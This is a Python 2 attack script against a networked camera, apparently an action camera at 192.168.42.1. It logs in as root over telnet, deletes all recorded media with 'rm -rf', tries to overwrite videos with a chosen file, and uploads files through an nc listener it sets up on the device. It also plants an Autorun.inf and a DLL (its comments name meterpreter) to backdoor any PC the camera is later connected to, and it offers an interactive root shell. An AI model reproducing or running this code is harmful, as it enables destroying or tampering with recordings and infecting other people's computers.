from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

import argparse
import telnetlib
import threading
import time
import socket
import re

def delete_media(tn):
	print 'deleting media'
	prompt = '#'
	cmd = 'cd /tmp/fuse_d/DCIM/100MEDIA/'
	print tn.write(cmd + '\r\n')
	print tn.write('rm -rf *.* \r\n')
	print tn.read_until(prompt)
	return

#tn= telnet
#path = local path
#fname = remote file name
#sname = remote script name
#port = port to connect to int
def transfer_file(tn, path, fname, sname, port):
	fd = open(path)
	data = fd.read()
	fd.close()
	tn.write('echo "nc -l -p %s > %s " > %s\r\n' % (str(port), fname, sname) )
	tn.write('ls \r\n')
	#print tn.read_until('#')
	tn.write('chmod +x %s\r\n' % (sname))
	tn.write('sh %s &\r\n' % (sname))
	time.sleep(1)
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.42.1',port))
	s.send(data)
	s.close()
	
	tn.write('ls \r\n')
	output = tn.read_until('#').split('\r\n')
	transfer_success = False
	for line in output:
		if line.find(fname) > -1:
			transfer_success = True
	#time.sleep(1)
	if transfer_success:
		print 'file transfered: ', path
	else:
		print 'oh noes!'
	return

def write_file(tn, name, contents):
	#print 'in write_file, name:', name
	#print 'in write_file, contents:', contents
	tn.write('echo "ls " > %s\r\n' % (name))
	tn.write('chmod +x %s \r\n' % (name))
	
	for cont in contents:
		print tn.write('echo "%s" >> %s\r\n' % (cont, name))
		print 'echo "%s" >> %s\r\n' % (cont, name)
	return 

def delete_file(tn, name):
	tn.write('ls \r\n')
	output = tn.read_until('#')
	while name in output:
		tn.write('rm -rf %s\r\n' % (name))
		tn.write('ls \r\n')
		output = tn.read_until('#')



def replace_media(tn, path):
	print 'replace_media not implemented'
	#we have a race condition with cp 
	#so its not working from the script
	#keep this code till we have a work around
	#
	return
	prompt = '#'
	#cd to the correct directory
	tn.write('cd /tmp/fuse_d/DCIM/100MEDIA/ \r\n')
	tn.read_until(prompt)
	tn.write('ls \r\n')
	#put it in a list so its easier to iterate
	output = tn.read_until(prompt).split('\r\n')
	ansi = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
	files = []
	for line in output:
		if line.find('MP4') > -1:
			#strip the ansi encoding
			files.append(ansi.sub('', line))
	print 'now we have the files to wipe:', files
	#uploading mp4
	transfer_file(tn, path, path, 'test.sh', 8888)
	cmd_str = []
	for f in files:
		#cmd_str.append('rm -rf %s\n' % (f))
		#cmd_str.append('ping 0.0.0.0 -c 1\n')
		cmd_str.append('cp -f %s %s\n' %(path, f))
	#cmd_str.append('rm -rf %s\n' % (path))
	#cmd_str.append('rm -rf *.sh\n')
	#cmd_str.append('rm -- "$0"\n')
	fd = open('tmp.sh', 'wb')
	fd.write(''.join(cmd_str))
	fd.close()
	
	transfer_file(tn, 'tmp.sh', 'tmp.sh', 'test2.sh', 8887)
	
	tn.write('sh tmp.sh\n')
	print tn.read_until(prompt)
	tn.write('ls -l\n')
	print tn.read_until(prompt)
	#tn.write('sh tmp.sh \n')
	#print tn.read_until(prompt)
	#tn.write('ls \n')
	#print tn.read_until(prompt)
	
	return




def backdoor_device(tn, path):
	#todo: take a directory
	print 'backdoor_device() not implemented'
	#upload autorun.inf
	#upload msf dll
	#pwn
	autorun = '[autorun]\r\n'
	autorun += ';Open=PlayMe.exe\r\n'
	autorun += 'ShellExecute=PlayMe.exe\r\n'
	autorun += 'UseAutoPlay=1\r\n'
	fd = open('Autorun.inf', 'wb')
	fd.write(autorun)
	fd.close()
	tn.write('cd /tmp/fuse_d/\r\n')
	tn.read_until('#')
	transfer_file(tn, 'Autorun.inf', 'Autorun.inf', 'test.sh', 8888)
	transfer_file(tn, 'test.dll', 'test.dll', 'test.sh', 8887)
	tn.write('rm test.sh\r\n')
	print 'done'
	return



def main(args):
	#connect to camera
	host = args.ip
	user = 'root'
	prompt = '~ #'
	tn = telnetlib.Telnet(host)
	tn.read_until('login: ')
	tn.write(user + '\r\n')
	tn.read_until(prompt)
	
	if args.delete == True:
		delete_media(tn)
		print 'media deleted!'
		return
	
	elif args.replace:
		replace_media(tn, args.replace)
		return

	elif args.backdoor:
		backdoor_device(tn, args.backdoor)

	else:
		print 'dropping to shell'
		while True:
			try:
				cmd = raw_input('')
				tn.write(cmd+'\r\n')
				print tn.read_until('#')
			except KeyboardInterrupt:
				print 'exiting...'
				tn.write('exit\r\n')
	return
	
	#telnet
	#upload shell script to 
		#remount file system
		#delete videos / overwrite with selected 
		#copy autorun.inf
		#copy meterpreter.dll
		#remount filesystem
		#activate streaming???
		#exit

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-d', '--delete', action='store_true', help='delete all media on the device')
	parser.add_argument('-r', '--replace', action='store', help='replace media on device with file: takes path')
	parser.add_argument('-b', '--backdoor', action='store', help='upload backdoor to attack pc: takes path')
	parser.add_argument('-i', '--ip', action='store', help='the remote ip of the camera; should be 192.168.42.1', required=True)
	args = parser.parse_args()
	#-b should take a directory
	#maybe used delete and replace to fix the race condition
	main(args)
